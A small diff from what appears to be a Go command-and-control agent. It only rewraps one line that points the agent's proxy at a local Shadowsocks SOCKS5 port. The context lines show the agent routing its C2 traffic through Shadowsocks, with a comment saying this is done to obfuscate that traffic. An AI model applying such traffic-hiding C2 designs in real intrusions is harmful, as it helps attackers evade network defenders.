@@ -249,7 +249,8 @@ test_agent:
 
 				if agent.RuntimeConfig.UseShadowsocks {
 					// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
-					agent.RuntimeConfig.AgentProxy = fmt.Sprintf("socks5://127.0.0.1:%s", agent.RuntimeConfig.ShadowsocksPort)
+					agent.RuntimeConfig.AgentProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
+						agent.RuntimeConfig.ShadowsocksPort)
 					go agent.ShadowsocksC2Client()
 				}
 			}
